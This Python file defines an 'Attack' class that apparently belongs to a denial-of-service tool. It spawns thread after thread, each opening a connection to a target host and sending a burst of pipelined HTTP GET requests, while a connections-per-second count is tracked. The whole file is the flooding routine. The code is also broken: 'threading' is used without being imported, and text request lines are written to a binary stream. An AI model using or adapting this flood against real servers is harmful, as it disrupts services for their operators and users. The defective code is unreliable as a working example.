import socket
import time

import Main


class Attack:
    def run(self):
        while not Main.isRunning():
            try:
                time.sleep(1)
            except:
                pass
        while Main.isRunning():
            def thread_func():
                try:
                    with socket.socket() as s:
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        s.settimeout(1)
                        try:
                            s.connect((Main.getUrl().getHost(), Main.getUrl().getPort()))
                        except:
                            s.connect((Main.getUrl().getHost(), Main.getUrl().getDefaultPort()))
                        with s.makefile('wb') as writer:
                            Main.cps += 1
                            for i in range(Main.getRpc() + 1):
                                writer.write("GET /%s HTTP/1.1\r\n" % Main.getUrl().getPath().encode('utf-8'))
                                writer.write("Host: %s\r\n" % Main.getUrl().getHost().encode('utf-8'))
                                writer.write("\r\n".encode('utf-8'))
                except:
                    pass

            t = threading.Thread(target=thread_func)
            t.start()
